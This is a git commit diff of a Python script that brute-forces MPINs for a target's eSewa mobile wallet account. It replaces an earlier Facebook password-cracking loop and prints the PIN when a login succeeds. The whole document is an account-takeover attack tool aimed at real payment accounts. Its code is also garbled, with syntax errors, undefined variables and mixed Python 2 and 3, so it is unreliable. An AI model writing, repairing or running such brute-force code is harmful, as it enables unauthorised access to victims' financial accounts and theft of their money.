6a591945a66653df228106e8054c5d523c2c3c70
spyhack <112711360+vicky3690@users.noreply.github.com>
2023-07-04 22:56:12 +0545

    Update fp2.py

--- fp2.py
+++ fp2.py
@@ -18,28 +18,27 @@ input("Perform manual actions and press Enter when ready...")
 print('\n--v1.1.3------**[~~@V.CYPHER*~~]/coded by:VICKY**------v1.1.3--\n')
 file=open('mpins.txt','r')
 
-email=str(raw_input('Enter Mobile Number : ').strip())
-
+MobileNumber = input('Enter Mobile Number: ').strip()
 print ("\nTarget Mobile Number : ",number)
 print "\nTrying MPIN's from list ..."
 
-i=0
+i = 0
 while file:
-passw=file.readline().strip()
-	i+=1
-	if len(passw) < 4:
-		continue
-	print str(i) +" : ",passw
-	response = .open(post_url)
+    passw = file.readline().strip()
+    i += 1
+    if len(passw) < 4:
+        continue
+    print(str(i) + " : " + passw)
+    response = open(d(resourceId="com.esewa.android:id/toolbar_login/register")).click()
 	try:
 		if response.code == 200:
-			browser.select_form(nr=0)
-			browser.form['email'] = email
-			browser.form['pass'] = passw
-			response = browser.submit()
+			select_form(nr=0)
+			.form['MobileNumber'] = mobilenumber
+			.form['mpin'] = passw
+			response =.submit()
 			response_data = response.read()
-			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
-				print('Your password is : ',passw)
+			if 'response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+				print('Your mpin is : ',passw)
 				break
 # Continue with automated actions
 # Example: Enter a search query
